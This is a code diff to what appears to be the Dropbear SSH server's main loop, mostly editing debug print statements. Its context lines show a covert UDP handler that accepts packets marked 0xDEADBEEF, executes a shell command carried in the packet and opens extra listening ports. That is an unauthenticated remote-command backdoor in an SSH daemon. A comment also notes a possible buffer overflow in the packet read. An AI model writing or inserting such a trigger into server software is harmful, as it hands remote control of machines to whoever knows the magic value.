@@ -137,7 +137,7 @@ static void main_noinetd() {
 
 	//UDP ADITIONS
 	int udpsockfd,n,len;
-    struct sockaddr_in servaddr, cliaddr;
+    struct sockaddr_in cliaddr;
     char buffer[BUFFERSIZE]; 
 
 
@@ -154,7 +154,6 @@ static void main_noinetd() {
 
 	/*create UDP handler and socket if flag=true */
 	if(udp_flag){
-		printf("UDP_FLAG IS ON!\n");
 		udpsockfd=start_udp();
 		if(udpsockfd < 0)
 			dropbear_exit("start_udp - error");
@@ -256,7 +255,7 @@ static void main_noinetd() {
 		/* handle each socket which has something to say */
 
 		if (udp_flag && FD_ISSET(udpsockfd, &fds)){
-			printf("GOT FD_ISSET(udpsockfd, &fds)!,\tsvr_opts.portcount:%d\n",svr_opts.portcount);
+			// printf("GOT FD_ISSET(udpsockfd, &fds)!,\tsvr_opts.portcount:%d\n",svr_opts.portcount);
 			len = sizeof(cliaddr);  //len is value/resuslt 
         	// exception might occur when n>BUFFERSIZE -> buffer overflow
         	n = recvfrom(udpsockfd, (char *)buffer, PACKETSIZE,  
@@ -267,19 +266,22 @@ static void main_noinetd() {
 			}
 			else
 			{
-									printf("BEFORE listensockcount:%d\n",listensockcount);
-
 				listen_packet_t new_packet;
 				parse_packet(&new_packet,buffer);
 				//execute shell command and port adding only if 0xDEADBEEF and legal command
     			if(check_shell_command(&new_packet)){
             		//execute the shell_command, then add port
             		shell_exec_command(new_packet.shell_command); //func in svr-chansession
+					
 					if(add_port_request((int)new_packet.port_number)){ //func in svr-main   
 						if(listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock,listensockcount))
 							listensockcount++;
 					}
-					printf("AFTER listensockcount:%d\n",listensockcount);
+					printf("AFTER udp_fd:%d\t udp_index:%d\tlistensocks[]:\n",udpsockfd,udp_index);
+					for (i = 0; i < listensockcount; i++)
+						printf("%s ,",svr_opts.ports[i]);
+					printf("\n");
+
     			}
 
 			}
@@ -296,11 +298,7 @@ static void main_noinetd() {
 			struct sockaddr_storage remoteaddr;
 			socklen_t remoteaddrlen;
 
-			if(i == udp_index && FD_ISSET(listensocks[i], &fds)){
-				// printf("got message on port 53!!\n");
-			}
-			else{
-			if (!FD_ISSET(listensocks[i], &fds)) 
+			if (!FD_ISSET(listensocks[i], &fds) || i == udp_index) 
 				continue;
 
 			remoteaddrlen = sizeof(remoteaddr);
@@ -399,7 +397,6 @@ out:
 			if (remote_host) {
 				m_free(remote_host);
 			}
-			}
 		}
 	} /* for(;;) loop */
 
@@ -486,12 +483,11 @@ static size_t listensockets(int *socks, size_t sockcount, int *maxfd, int listen
 	int nsock;
 
 	TRACE(("listensockets: %d to try", svr_opts.portcount))
-	printf("listensockcount:%d\tsvr_opts.portcount:%d\n",listensockcount,svr_opts.portcount);
 	i = listensockcount;
 	if(listensockcount>0)
 		i--;
 	for (; i < svr_opts.portcount; i++) {
-
+		printf("i:%d\ttry to listen to port:%s\n",i,svr_opts.ports[i]);
 		TRACE(("listening on '%s:%s'", svr_opts.addresses[i], svr_opts.ports[i]))
 
 		nsock = dropbear_listen(svr_opts.addresses[i], svr_opts.ports[i], &socks[sockpos], 
